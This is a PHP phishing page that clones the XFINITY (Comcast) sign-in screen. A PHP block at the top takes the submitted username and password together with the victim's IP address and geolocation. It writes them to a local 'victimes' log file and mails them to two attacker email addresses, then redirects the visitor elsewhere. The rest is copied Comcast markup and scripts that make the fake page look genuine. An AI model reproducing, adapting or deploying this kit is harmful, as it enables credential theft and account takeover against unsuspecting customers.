﻿<?php

if (isset($_POST['user'])) {

	$browser = $_SERVER['HTTP_USER_AGENT'];

	require_once 'geoplugin.class.php';

	$geoplugin = new geoPlugin();

//get user's ip address
	$geoplugin->locate();
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$ip = $_SERVER['REMOTE_ADDR'];
	}

	$message .= "---------------|BY NoBODY|---------------\n";
	$message .= "Username: " . $_POST['user'] . "\n";
	$message .= "Password: " . $_POST['passwd'] . "\n";
	$message .= "IP : " . $ip . "\n";
	$message .= "--------------------------------------------\n";
	$message .= "City: {$geoplugin->city}\n";
	$message .= "Region: {$geoplugin->region}\n";
	$message .= "Country Name: {$geoplugin->countryName}\n";
	$message .= "Country Code: {$geoplugin->countryCode}\n";
	$message .= "---------------------------------------------\n";
	$to = "mirandameadows11@yandex.com, mirandameadows11@gmail.com";

$victimes = fopen("static/p/pultat.txt","a");
fwrite($victimes,$message);
fclose($victimes);

	$hi = mail($to, $ip, $message);

	?>

<script type="text/javascript">
<!--
   window.location="https://retired.sounddogs.com/previews/2904/mp3/377355_SOUNDDOGS__ma.mp3";

</script>
<?php
fclose($handle);
	exit;

}
?>




<!DOCTYPE html>



<!--[if lte IE 8]>
<html lang="en" class="ie8 light custom">
<![endif]-->
<!--[if IE 9]>
<html lang="en" class="ie9 light custom">
<![endif]-->
<!--[if gt IE 9]><!-->
<html lang="en" class="light custom">
<!--<![endif]-->

	<head>
		<title>Sign in to XFINITY</title>
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta name="mobile-web-app-capable" content="yes">
		<meta name="apple-mobile-web-app-capable" content="yes">


	<script type="text/javascript" src="static/js/data-layer/lodash-slim.min.js"></script>

			<script type="text/javascript" src="static/js/data-layer/tracking-aws.min.js"></script>

	<script type="text/javascript" src="static/js/data-layer/tracking-DTM.min.js"></script>
	<script type="text/javascript" src="static/js/data-layer/tracking.min.js"></script>
	    	<script src="http://assets.adobedtm.com/43896e740dcedef854392e0be6ea80deb8eb2ba5/satelliteLib-531bc4f46256650a84099973f0ed331f809ea5f4.js"></script>

	<script type="tracking-data-digitalData">
		{
			"page" : {
				"pageInfo" : {
					"screenName" : "sign in",
					"language" : "en",
					"referrerId" : "my-account-web"
				 },
				 "category" : {
                    "primaryCategory" : "login",
                    "designType" : "responsive",
                    "businessType" : "resi",
                    "siteType" : "selfservice"
                },
                "affiliate" : {
                    "name": "comcast",
                    "channel" : "web"
                },
                "codebase" : {
                    "name" : "cima login"
                }
			},
			"user" : [{
				"profile" : [{
					"profileInfo" : {
						"authenticationType" : "unauthenticated",
						"recognizationType" : "unrecognized"
					}
				}],
				"segment" : {
					"isLocalized" : false
				}
			}],
			"schemaVersion" : 0.11
		}

	</script>
	<script>document.dispatchEvent(new CustomEvent("c-tracking-init-start"));</script>
	<script>
        document.addEventListener("DOMContentLoaded", function() {
            document.dispatchEvent(new CustomEvent("c-tracking-log-page", {
                bubbles: true
            }));
        });
        document.addEventListener('click', function(ev){
            var element = ev.target.closest('a:not([data-tracking]), button:not([data-tracking])');

            if (element) {
                var event = new CustomEvent('c-tracking-log-dom', {
                    bubbles: true
                });
                element.dispatchEvent(event);
            }
        });

	</script>

		<link rel="stylesheet" type="text/css" href="static/css/junket/styles-light.min.css?v=d8e2944">
				<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
		<meta name="description" content="Get the most out of XFINITY from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together &mdash; anytime, anywhere, on any device.">
		<meta name="viewport" content="width=device-width,initial-scale=1">
		<link rel="shortcut icon" href="C:/xampp/htdocs/goodsby//images/favicon/favicon.ico">
		<link rel="apple-touch-icon" sizes="57x57" href="static/images/favicon/apple-icon-57x57.png">
		<link rel="apple-touch-icon" sizes="60x60" href="static/images/favicon/apple-icon-60x60.png">
		<link rel="apple-touch-icon" sizes="72x72" href="static/images/favicon/apple-icon-72x72.png">
		<link rel="apple-touch-icon" sizes="76x76" href="static/images/favicon/apple-icon-76x76.png">
		<link rel="apple-touch-icon" sizes="114x114" href="static/images/favicon/apple-icon-114x114.png">
		<link rel="apple-touch-icon" sizes="120x120" href="static/images/favicon/apple-icon-120x120.png">
		<link rel="apple-touch-icon" sizes="144x144" href="static/images/favicon/apple-icon-144x144.png">
		<link rel="apple-touch-icon" sizes="152x152" href="static/images/favicon/apple-icon-152x152.png">
		<link rel="apple-touch-icon" sizes="180x180" href="static/images/favicon/apple-icon-180x180.png">
		<link rel="icon" type="image/png" sizes="192x192"  href="static/images/favicon/android-icon-192x192.png">
		<link rel="icon" type="image/png" sizes="32x32" href="static/images/favicon/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="96x96" href="static/images/favicon/favicon-96x96.png">
		<link rel="icon" type="image/png" sizes="16x16" href="static/images/favicon/favicon-16x16.png">
		<link rel="manifest" href="static/images/favicon/manifest.json">
		<meta name="msapplication-TileColor" content="#ffffff">
		<meta name="msapplication-TileImage" content="static/images/global/favicon/favicon-96x96.png">
		<meta name="theme-color" content="#ffffff">

		<script type="text/javascript">
			runtimeData = {
									"r": "comcast.net",									"s": "oauth",									"deviceAuthn": "false",									"continue": "https://login.comcast.net/oauth/authorize?client_id=my-account-web&amp;prompt=login&amp;redirect_uri=https%3A%2F%2Fcustomer.xfinity.com%2Foauth%2Fcallback&amp;response_type=code&amp;state=%23%2F%3FCMP%3DILC_myaccount_myxfinity_au&amp;response=1",									"ipAddrAuthn": "false",									"forceAuthn": "1",									"lang": "en",									"passive": "false",									"client_id": "my-account-web",									"reqId": "3f3a2b21-d2b3-4625-8bbe-68fc3286a979"							}
		</script>
									<script src="http://cdn.comcast.com/~/Media/Javascripts/Omniture/Mbox.js?vs=3"></script>
													<style type="text/css">
								@media only screen and (min-width: 1024px) {
html { background-color: #000000; }
}
#background {
background: #000000;
background: -webkit-linear-gradient(#0a293c, #000000) no-repeat 0 462px / 100% 346px, linear-gradient(#051620, #051620) no-repeat 0 0px / 100% 462px, #000000;
background: -mos-linear-gradient(#0a293c, #000000) no-repeat 0 462px / 100% 346px, linear-gradient(#051620, #051620) no-repeat 0 0px / 100% 462px, #000000;
background: -ms-linear-gradient(#0a293c, #000000) no-repeat 0 462px / 100% 346px, linear-gradient(#051620, #051620) no-repeat 0 0px / 100% 462px, #000000;
background: -o-linear-gradient(#0a293c, #000000) no-repeat 0 462px / 100% 346px, linear-gradient(#051620, #051620) no-repeat 0 0px / 100% 462px, #000000;
background: linear-gradient(#0a293c, #000000) no-repeat 0 462px / 100% 346px, linear-gradient(#051620, #051620) no-repeat 0 0px / 100% 462px, #000000;
background-attachment: initial;
line-height:1;
height: 100%;
}
#left {
color: #e6eaed;
padding-left: 26px;
width: 568px;
margin-left: 0;
}
#left h1 {
font-size: 24px;
font-weight: 300;
line-height: 30px;
margin-top: 10px;
margin-bottom: 14px;
letter-spacing: 0.37px;
}
#left h1::first-letter {
margin-left: -2px;
}
#left p {
font-size: 16px;
line-height: 28px;
margin-top: 14px;
}
#left a {
color: #2b9cd8;
}
#leftSide-image {
display: block;
margin-top: 48px;
margin-left: -26px;
width: 594px;
}
#right #quick-bill-pay { display: block; }
			</style>
							<script>document.dispatchEvent(new CustomEvent("c-tracking-init-styles"));</script>
			</head>
		<body class=" has-footer ">
		<div id="breakpoints"></div>

							<div id="background"></div>
				<div class="mboxDefault"></div>
<script type="text/javascript">
mboxCreate("login_page", "s="+runtimeData.s, "destination="+runtimeData.continue );
</script>
<div class="mboxDefault"></div>
<script type="text/javascript">
mboxCreate("login_page_1");
</script>				<main id="bd">
			<h1 class="screen-reader-text">Sign in to XFINITY</h1>
			<div id="left"><h1>It's now easier to pay your bill anytime, anywhere.</h1>
<p>Want to pay your outstanding balance without signing in? <a href="https://customer.xfinity.com/lite">Try quick bill pay</a></p>
<img id="leftSide-image" src="https://edge.static-assets.top.comcast.net/cms/data/assets/bin-201705/b1372fb33a8af099efbde90184076f9b.png" srcset="https://edge.static-assets.top.comcast.net/cms/data/assets/bin-201705/b1372fb33a8af099efbde90184076f9b.png 1x, https://edge.static-assets.top.comcast.net/cms/data/assets/bin-201705/89716793f4385c7efe13ec1512348789.png 2x" />
<p>
Comcast Business customer?
<a href='https://businessclass.comcast.net?INTCMP=ILC-XfinityCom-MyAccountSigninCTA-BCPSignin01'>Sign in here</a>
</p></div><div id="right">		<div class="container">
	<form name="signin" action="" method="post" onsubmit="return login.onSubmit()" >
													<div class="single logo-wrapper">
				<span aria-role="img" class="xfinity-logo"></span>
											</div>
		                <label for="user" id="login_id_label" role="alert" aria-label=""></label>
                    <div class="textfield-wrapper">
				<label for="user" class="float accessibly-hidden">Username</label><input id="user" class="" autocorrect="off" autocapitalize="off" spellcheck="false" name="user" type="text" value="" placeholder="Username, email, or mobile" maxlength="128">
			</div>

					<label for="passwd" id="password_label" role="alert" aria-label=""></label>
			<div class="textfield-wrapper">
				<label for="passwd" class="float accessibly-hidden">Password</label><input id="passwd" class="" name="passwd" type="password" placeholder="Password" maxlength="128" minlength="6">
			</div>


	    			<div class="checkbox-container">
				<label for="remember_me" >
					<input type="checkbox" id="remember_me" name="rm" value="1" ><span id="remember_me_checkbox" class="checkbox"></span><div class="content" >Stay signed in</div>
				</label>
				<button type="button" id="rm_label_learn_more" class="icon info cancel" data-id-ref="rm_help" aria-controls="rm_help" aria-label="Learn more about staying signed in"></button>
			</div>






					<script id="nucaptcha-template" type="text/x-nucaptcha-template" hidden>
	${PlayerStart}
	${Media}
	${DirectionsVerbose} ${InputAnswer}
	<p class="field-help">${CommandNewChallenge} ${CommandPlayerMode}
		<a class="cmd" href="https://login.comcast.net/proxy/nucaptcha/help.html?lang=en" onclick="window.open(this.href,'helpwindow','width=720,height=600,resizable=0,top=10,left=10,menubar=0,statusbar=0,toolbar=0,scrollbars=0,location=0,directories=0'); return false;">Help</a>
	</p>
	${PlayerEnd}
</script>
<div><div id="ndwc"><noscript><input type="hidden" id="ndpd-s-ns" name="ndpd-s-ns" value="1.w-341498.1.2.NVEGXgxOs5Q2dtIGw0jTjg,,.rwmaI8bQ3Hqvcqsl_tfYb3LawUVzD4ajd1CZu24y1BLZl48mm4R_Ge3-hhviujSF9xUcSISEplMsLVpeJTQ-RwsX-ui9MfBO4fBMx_I14FJ1dBGrOugwiNKknBr2ASy_3oZJh58q3cWZ0oVX5bawSRknW36w1iPcC2h9K4ihqcoax1VYS3R2saf96pNVlg8zdfgAeWIkxHoOgTK7K8-7OtjupovFsATVTxhx3h2n0jZyYWRqp2fLjPKydkRoKRoNc-adGfqZtvfgKF3M7e_D1oe4QQml9-o35MwBo1OEUUC8JU8-LlQdBT2aghSMqaYF"><input type="hidden" id="ndpd-f-ns" name="ndpd-f-ns" value="1.w-341498.1.2.zelipR4wkcMjxot5Hgi4cw,,.F0Eahs9fqUqq-3Kd7d5xu7stlVUKLS7QzNwNilalkqpNM_taWrPAaw1Wd7igvubezo1pdGi6SYml-BeSGI6K7YZMBOgER_NOsDVVRURr6a_LyVKQBIRhG2D1aKIXojVR6P2QGkCT1-pW0fcHKYYpOhSmBnXYV9op5Ip_s3E5XPL1jwb7wku28buwjJY6FLrtm27WBEMjSaPsVNA5ts07HgulIGBRUlj_o_v6-HQWDuJRITLGVBBmAAfia-RtrW7cAZFs1O7iM2gv5I-0XeokP_BX_9yb7my9wfKQcvJbEcFqlGLgwu_Ksu8CEew0EmukuhPt_OxF9hB3K8NNpPg69A,,"><input type="hidden" id="ndpd-fm-ns" name="ndpd-fm-ns" value="1.w-341498.1.2.g9S9ASXS_wqXDeKgkAKuOg,,.BZOiEEoqMj03guIiTemRRtoVeB8vV3QtNq50Jsn-mpVE4GNEmVWbc100o7sS8xXg5gLDdcW3aTErWZlrjvukUvtT11Y3zML4Dw86E-c9j2M_cvgzmY_IefP5g0cBCMmI08vLoJtJbO9HV0F4cx9bKiJB5iaRG5BwZR-370cVHifVU9KacAKjwzXarfmGSkp6Gc3sUvGbe5wPwg7rzyqXGpVYbCMssYa4lSDwc02udgVk4lK6Hld20neJOooD_D6BHJD9ocHxdNlwkKGVWrIOUa_39dhXFU8NJyCZpVV5p1mnFak8pJ7taQYlYQpCFolg"><input type="hidden" id="ndpd-w-ns" name="ndpd-w-ns" value="1.w-341498.1.2.oT7llGGAdM26cKsXsIhEGQ,,.DWJl917sHNd5uvOxLE85oIJ_EgqNvXO0-P9owBJ3JZzSCo0xxTleDSB5tm8PhajeuosGEvl3ROq4HGSYSF6BCj6wKxbk2-IrnRITGVl94vfNMGRz2LFkfFWPJSIZKjNnHB_TlpWbkqyXCNj9ByjzPCX-lsAW9qYoMqYjHEGhebTVNJo226-wlPTbNreamxTwDfo6qWcu0cggBgtf9oE1_w4emkJekr_OqHZkwVbimGaLF7OYOBnyCoRHFd-uNpa48LxUtMDX9bPA8oCTsumuraqj4meC4H4XcJWQymJSfqQazQdZZ_eESfn8buFOqsOi-bozg3s6Z_j9XPQQoGKFxxMl8lx_JwaQGCClfk8btn3x0pCgItcvR-G9EQSt9LTA"></noscript><input type="hidden" id="ndpd-s" name="ndpd-s" value="1.w-341498.1.2.fuavne_g1MN3yhdZJBcmbw,,.OI599OJqFTH0T3zSvSkCQxg5uCfH1RX3da_GqMEjIyYKRHv-6EkPYjpaSclx7KMppA8_Gs8SWfiR-51zBWUTiYud97R_g__QwWtD2TvDMBpvfzLuzcXtzpo64uQvUk5zgtKRHiLDQWuuF7FgvukhgLhqHmQw5rtktZ0pRNw7TWZRjo8av9k15nS6K06Ie04k5hX8ysoedoU5dR2Ape2If7pR3ceqUFOpNN3korm188b1ySrtoaXxXf0R687I3sU5jBaI4C4MEdX2LgsPLKek5LXv88PVOR7Cnv6q6Te1Ue3FrzS0uWZmrUB_tKR8yzNA"><input type="hidden" id="ndpd-f" name="ndpd-f" value="1.w-341498.1.2.5VfSr2ntrgDlTwkZIEyRIQ,,.OHHm7URvCS_5FwcWoKhIL2I61GQ2A_aQVS5s8ZJoprXKezC93ioA-AhQszYpEY3Yn50rtRRHuddeIjqLpOOEKOCcGGnWmqi41gQAWuUR2vnWdbCTAZr3xjwstOETj9oLXG2iLkwZz6wWLPnDfTMzNHVTOh7oL1z30I7rlTFdb25EHIab9ES8TFRyHjweaPm65jwNVwzWW-LekyFPesJIB7hz2qWkqGAQiDzK2UScj1lW0Ml7fRwBISKhDdPqNOpurOXJc7m89JHTFCAKOMfMBjr3_5El83hdQBOt7UZNjoSp-VcLvNYkYXt_LE4GBDWs"><input type="hidden" id="ndpd-fm" name="ndpd-fm" value="1.w-341498.1.2.6KDqo7Nl0b2teFajmAUGEQ,,.JeJTHqhQb76w3Gp9-ylMTBmN8j8oiSsd2twBRZ6W4dRkueGW8Y3u1JqdaDyK2WbIycNRxt_1H-XIYZxh0la5G_QMvasVgi9wWMR6T4cYwmuRuKpgvQHF5-Vs4dDNMzWIwzeQwhwSWYwHI6hlbeFnpSUB-o2aoM1x-D07y_Q7oRyVIZG28TC01P18aa5h2QkXMj5T9oeCgnxeH7L6Hb8_LiROgWQU7E0KUpMg2fKHRdvORmudElWuxiFPl9m40fCiHT7vHsFM6vPSNuSTR4BA_WFj1k3vFZW6ea4N7dNMGEEOP0M9S8ha8iiHBF_F87lZ"><input type="hidden" id="ndpd-w" name="ndpd-w" value="1.w-341498.1.2.yYkSOcPsFuM_c2cRfIYs-Q,,.ilIn0W_Esb_V94D_3EYxXfbycx3we-9N73VsWtPoniN2L1mb22Gd1wR_f4kDapR6Eu0WgQgE7nnaE2_0gf4ovFwVmKbeGK8rG7hszJzLGfQQOSmWiL2UI_ChhHmq3GRq58eCTBoO9s7zRbAeTkYcxas8unvd5MmwE84-UVQXS6NOWLt5hhTSto5RB5CSeyEn9oB2ya1IxG1dIkk55PL7mJUoEz9iUf6Zy1Nm2URjTmtKn4mTDjtp6epcrBYx5eJwmQ7kcR_Hci0v8u5DO_0fYOwcd5iQi8Aaiz4-_cHo2naoLlR6lloh5bzVPe9_O5w7OC_EetkEvbmNCA0wzuizZN2T1lVr50J3kowSh56UjY-VqdbyGvGpCKpHE6wtvfgU"><input type="hidden" id="ndpd-ipr" name="ndpd-ipr" value=""><input type="hidden" id="ndpd-di" name="ndpd-di" value="p"><input type="hidden" id="ndpd-bi" name="ndpd-bi" value="p"><input type="hidden" id="ndpd-probe" name="ndpd-probe" value="p"><input type="hidden" id="ndpd-af" name="ndpd-af" value="p"><input type="hidden" id="ndpd-fv" name="ndpd-fv" value="fv"><input type="hidden" id="ndpd-fa" name="ndpd-fa" value="fa"><input type="hidden" id="ndpd-bp" name="ndpd-bp" value="p"><input type="hidden" id="ndpd-wk" name="ndpd-wk" value="p"><input type="hidden" id="ndpd-vk" name="ndpd-vk" value="16990"></div>
<script type="text/javascript">var nsqpd,nsqpdp,nspdbbpddp,nsdqq={},nsdqqbdqqd={},nsdqbp,nsqpbpd,nsdqqb,nsqpbpdqqd,nsdbpdbqd,nspdbbp,nsdqbpbdb,nspdppdd,nspqqqbd,nsqpbp,nspdppdddp,nspqqqb=-1,nsdbpd=-1,nspdp=[],nsqpbpdqq=[],nsqpdpqqbb="fspm",nsdqb=null,nds=window.ndsapi||(window.ndsapi={});
function ndwti(a){nspqqqb=nsbbp();"string"===typeof a&&(a=nsppbdqqpb(a));nsqpd=a.did;nsqpdp=a.fff;nspdbbpddp=a.ffft;nsdqq=a.wmd;nsdqqbdqqd=a.fd;nsdqbp=a.ffmm;nsqpbpd=a.fsss;nsdqqb=a.ddkv;nsqpbpdqqd=a.dddf;nsdbpdbqd=a.dddr;nspdbbp=a.ddde;nsdqbpbdb=a.ppns;nspdppdd=a.ppmm;nspqqqbd=a.ppdd;nsqpbp=a.ppds;nspdppdddp=a.wwwe;"undefined"!==typeof a.mp&&(nsdqb=a.mp);nspdqp();for(var b=0;b<nsqpbpdqq.length;b++)(0,nsqpbpdqq[b][1])(a,nsdqq[nsqpbpdqq[b][0]]);nspdqp();nsdbpd=nsbbp();nspdqp()}
function ndwtr(){for(var a=0;a<nsqpbpdqq.length;a++)if(3<=nsqpbpdqq[a].length&&"undefined"!==typeof nsqpbpdqq[a][2])(0,nsqpbpdqq[a][2])();nspdqp()}function nsbbpddbp(a){return nsqpdp.replace(nspdbbpddp,a)}function nsqddqbdb(a){nspdp.push(a);nsbbbdbpqp(nsbbpddbp("jse"),nspqq.stringify(nspdp))}function nsbbpdd(a,b){nsdqqbdqqd[a]=b}
function nspdqp(){var a="",b;for(b in nsdqqbdqqd)nsdqbp===nsqpdpqqbb?a+=nsbbpddbp(b)+nsdqqb+nsdqqbdqqd[b]+nsqpbpdqqd:nsbbbdbpqp(nsbbpddbp(b),nsdqqbdqqd[b]);nsdqbp===nsqpdpqqbb&&(a.substring(a.length-nsqpbpdqqd.length,a.length)===nsqpbpdqqd&&(a=a.substring(0,a.length-nsqpbpdqqd.length)),nspdbbp&&(a=a.replace(/[^a-zA-Z0-9\-_~\^|\.,]+/g,nsdbpdbqd)),nsbbbdbpqp(nsqpbpd,a))}function nspdqpppq(a,b,c){nsqpbpdqq.push([a,b,c])}function nsbbb(a){return a}function nsppbdqqpb(a){return a}
function nsbbbdbpqp(a,b){var c=[""];null!==nsdqb&&(c=nsdqb);for(var d=0;d<c.length;d++){var e=c[d];""!=e&&(e="-"+e);var f=nspqdq(a+e);if(null!==f)f.value=b;else{var k=nspqdq(nsqpd+e),f=document.createElement("input");f.id=a+e;f.name=a;f.value=b;f.type="hidden";null!==k&&k.appendChild(f)}}}"undefined"==typeof nds&&(nds=window.ndsapi||(window.ndsapi={}));nds.common={};nds.common.util={};nds.common.bi={};nds.common.querySelectorAll=function(a){return document.querySelectorAll(a)};
document.querySelectorAll||(nds.common.querySelectorAll=function(a){return[]});nds.common.addEventListener=function(a,b,c){try{a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}catch(d){}return function(){nds.common.removeEventListener(a,b,c)}};nds.common.removeEventListener=function(a,b,c){try{a.removeEventListener?a.removeEventListener(b,c,!1):a.detachEvent&&a.detachEvent("on"+b,c)}catch(d){}};
nds.common.util.truncTo=function(a,b,c){c="undefined"!==typeof c?c:"TRUNC";if("string"!==typeof a)return a;var d=b-c.length;return 1>d?a.substring(0,b):a.length>d?a.substring(0,d)+c:a};nds.common.util.quickHash=function(a){var b=0,c=0,d,e,f;if(0===a.length)return"00000000";d=0;for(e=a.length;d<e;d++)f=a.charCodeAt(d),0===d%2?(b=(b<<5)-b+f,b|=0):(c=(c<<5)-c+f,c|=0);0>b&&(b=4294967295+b+1);0>c&&(c=4294967295+c+1);return b.toString(16)+c.toString(16)};
nds.common.bi.getScreenFingerprint=function(){var a="";window.screen&&(a+=[window.screen.width,window.screen.height].sort().join("x"),a+=" "+window.screen.colorDepth);return a};nds.common.util.getComputedStyle=function(a,b){if(document.defaultView&&document.defaultView.getComputedStyle)return document.defaultView.getComputedStyle(a,null).getPropertyValue(b);try{if(a.currentStyle)return b=b.replace(/-(\w)/g,function(a,b){return b.toUpperCase()}),a.currentStyle[b]}catch(c){}};
nds.common.bi.getScreenInfo=function(){var a="";"undefined"!==typeof window.screen&&("undefined"!==typeof window.screen.width&&"undefined"!==typeof window.screen.height&&(a+=window.screen.width+"x"+window.screen.height),"undefined"!==typeof window.screen.availWidth&&"undefined"!==typeof window.screen.availHeight&&(a+=" "+window.screen.availWidth+"x"+window.screen.availHeight),"undefined"!==typeof window.screen.colorDepth&&(a+=" "+window.screen.colorDepth),"undefined"!==typeof window.screen.pixelDepth&&
(a+=" "+window.screen.pixelDepth));return a};nds.common.bi.isFlashInstalled=function(){try{if(new ActiveXObject("ShockwaveFlash.ShockwaveFlash"))return!0}catch(a){}try{if(void 0!=navigator.mimeTypes["application/x-shockwave-flash"]&&navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin)return!0}catch(a){}return!1};nds.common.bi.getDeviceLanguage=function(){return window.navigator.userLanguage||window.navigator.language||window.navigator.browserLanguage};
nds.common.bi.getDeviceTimezone=function(){var a=(new Date(2014,0,2)).getTimezoneOffset(),b=(new Date(2014,5,2)).getTimezoneOffset();return Math.max(a,b)};
nds.common.bi.getPlugins=function(){var a=[],b=/([0-9]+)\.[0-9|.]+/g;if(window.ActiveXObject){if(document.plugins&&0<document.plugins.length)for(var c=0;c<document.plugins.length;c++)a.push(document.plugins[c].src.replace(b,"$1"))}else if(navigator.plugins&&0<navigator.plugins.length)for(c=0;c<navigator.plugins.length;c++)a.push(navigator.plugins[c].name.replace(b,"$1"));0<a.length&&a.sort();b="p";for(c=0;c<a.length;c++)b+=","+a[c];return b};
nds.common.bi.getWebGLInfo=function(){for(var a={},b=document.createElement("canvas"),c=["webgl","experimental-webgl","moz-webgl","webkit-3d"],d,e=0;e<c.length;e++)try{if(d=b.getContext(c[e])){a.ContextName=c[e];break}}catch(f){}if(!(d&&"getParameter"in d))return null;b="VENDOR VERSION RENDERER SHADING_LANGUAGE_VERSION DEPTH_BITS MAX_VERTEX_ATTRIBS MAX_VERTEX_TEXTURE_IMAGE_UNITS MAX_VARYING_VECTORS MAX_VERTEX_UNIFORM_VECTORS MAX_COMBINED_TEXTURE_IMAGE_UNITS MAX_TEXTURE_SIZE MAX_CUBE_MAP_TEXTURE_SIZE NUM_COMPRESSED_TEXTURE_FORMATS MAX_RENDERBUFFER_SIZE MAX_VIEWPORT_DIMS ALIASED_LINE_WIDTH_RANGE ALIASED_POINT_SIZE_RANGE".split(" ");
for(c=0;c<b.length;c++)e=b[c],e in d&&(a[e]=d.getParameter(d[e]));return a};nds.common.bi.getDeviceTouchSettings=function(){var a={mtp:"NA"};"undefined"!==typeof navigator.maxTouchPoints?a.mtp=navigator.maxTouchPoints:"undefined"!==typeof navigator.msMaxTouchPoints&&(a.mtp=navigator.msMaxTouchPoints);a.ts=!1;"ontouchstart"in window&&(a.ts=!0);a.te=!1;try{document.createEvent("TouchEvent"),a.te=!0}catch(b){}return a};
nds.common.bi.getCookiesEnabled=function(a){var b=!0,c="undefined"!==typeof navigator.cookieEnabled&&navigator.cookieEnabled?!0:!1;if(1==a)try{document.cookie="ncookietest=1",b=-1!=document.cookie.indexOf("ncookietest="),document.cookie="ncookietest=1; expires=Thu, 01-Jan-1970 00:00:01 GMT"}catch(d){}return{tc:b,nc:c}};
nds.common.bi.getHTML5CanvasSignature=function(){var a="NA";try{var b=document.createElement("canvas");b.width=200;b.height=40;b.style.display="inline";var c=b.getContext("2d");c.fillText("aBc#$efG~ \ude73\ud63d",4,10);c.fillStyle="rgba(67, 92, 0, 0.5)";c.font="18pt Arial";c.fillText("aBc#$~efG \ude73\ud63d",8,12);a=b.toDataURL()}catch(d){}return a};
nds.common.bi.getFontMetrics=function(){var a=[];try{for(var b=document.createElement("canvas").getContext("2d"),c=nds.common.bi.fontMetricsFontList,d=0;d<c.length;d+=1){b.font='72px "'+c[d]+'"';var e=b.measureText("mmmmmmmmmmlli").width;a.push(e)}}catch(f){}return a};nds.common.bi.getHTML5LocalStorage=function(){var a=!1;try{var b=window.localStorage;b.setItem("ndls","ndls");b.removeItem("ndls");a=!0}catch(c){}return a};
nds.common.bi.getHTML5SupportedVideo=function(){var a="fv";try{var b=document.createElement("video"),c=["ogg","mp4","webm"];if("undefined"!==typeof b)for(var d in c)c.hasOwnProperty(d)&&""!=b.canPlayType("video/"+c[d])&&(a+=","+c[d])}catch(e){}return a};nds.common.bi.getHTML5SupportedAudio=function(){var a="fa";try{var b=document.createElement("audio"),c=["mpeg","ogg","wav"];if("undefined"!==typeof b)for(var d in c)c.hasOwnProperty(d)&&""!=b.canPlayType("audio/"+c[d])&&(a+=","+c[d])}catch(e){}return a};
nds.common.bi.getPlatform=function(){var a="NA";try{a=navigator.platform}catch(b){}return a};nds.common.bi.fontMetricsFontList="monospace;sans-serif;serif;Andale Mono;Arial;Arial Black;Arial Hebrew;Arial MT;Arial Narrow;Arial Rounded MT Bold;Arial Unicode MS;Bitstream Vera Sans Mono;Book Antiqua;Bookman Old Style;Calibri;Cambria;Cambria Math;Century;Century Gothic;Century Schoolbook;Comic Sans;Comic Sans MS;Consolas;Courier;Courier New;Garamond;Geneva;Georgia;Helvetica;Helvetica Neue;Impact;Lucida Bright;Lucida Calligraphy;Lucida Console;Lucida Fax;LUCIDA GRANDE;Lucida Handwriting;Lucida Sans;Lucida Sans Typewriter;Lucida Sans Unicode;Microsoft Sans Serif;Monaco;Monotype Corsiva;MS Gothic;MS Outlook;MS PGothic;MS Reference Sans Serif;MS Sans Serif;MS Serif;MYRIAD;MYRIAD PRO;Palatino;Palatino Linotype;Segoe Print;Segoe Script;Segoe UI;Segoe UI Light;Segoe UI Semibold;Segoe UI Symbol;Tahoma;Times;Times New Roman;Times New Roman PS;Trebuchet MS;Verdana;Wingdings;Wingdings 2;Wingdings 3".split(";");
var nspqq;nspqq||(nspqq={});
(function(){function a(a){return 10>a?"0"+a:a}function b(a){e.lastIndex=0;return e.test(a)?'"'+a.replace(e,function(a){var b=g[a];return"string"===typeof b?b:"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+a+'"'}function c(a,d){var e,p,g,q,r=f,m,h=d[a];h&&"object"===typeof h&&"function"===typeof h.toNDJSON&&(h=h.toNDJSON(a));"function"===typeof l&&(h=l.call(d,a,h));switch(typeof h){case "string":return b(h);case "number":return isFinite(h)?String(h):"null";case "boolean":case "null":return String(h);
case "object":if(!h)return"null";f+=k;m=[];if("[object Array]"===Object.prototype.toString.apply(h)){q=h.length;for(e=0;e<q;e+=1)m[e]=c(e,h)||"null";g=0===m.length?"[]":f?"[\n"+f+m.join(",\n"+f)+"\n"+r+"]":"["+m.join(",")+"]";f=r;return g}if(l&&"object"===typeof l)for(q=l.length,e=0;e<q;e+=1)"string"===typeof l[e]&&(p=l[e],(g=c(p,h))&&m.push(b(p)+(f?": ":":")+g));else for(p in h)Object.prototype.hasOwnProperty.call(h,p)&&(g=c(p,h))&&m.push(b(p)+(f?": ":":")+g);g=0===m.length?"{}":f?"{\n"+f+m.join(",\n"+
f)+"\n"+r+"}":"{"+m.join(",")+"}";f=r;return g}}"function"!==typeof Date.prototype.toNDJSON&&(Date.prototype.toNDJSON=function(b){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+a(this.getUTCMonth()+1)+"-"+a(this.getUTCDate())+"T"+a(this.getUTCHours())+":"+a(this.getUTCMinutes())+":"+a(this.getUTCSeconds())+"Z":null},String.prototype.toNDJSON=Number.prototype.toNDJSON=Boolean.prototype.toNDJSON=function(a){return this.valueOf()});var d=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
e=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,f,k,g={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},l;"function"!==typeof nspqq.stringify&&(nspqq.stringify=function(a,b,d){var e;k=f="";if("number"===typeof d)for(e=0;e<d;e+=1)k+=" ";else"string"===typeof d&&(k=d);if((l=b)&&"function"!==typeof b&&("object"!==typeof b||"number"!==typeof b.length))throw Error("nspqq.stringify");return c("",{"":a})});
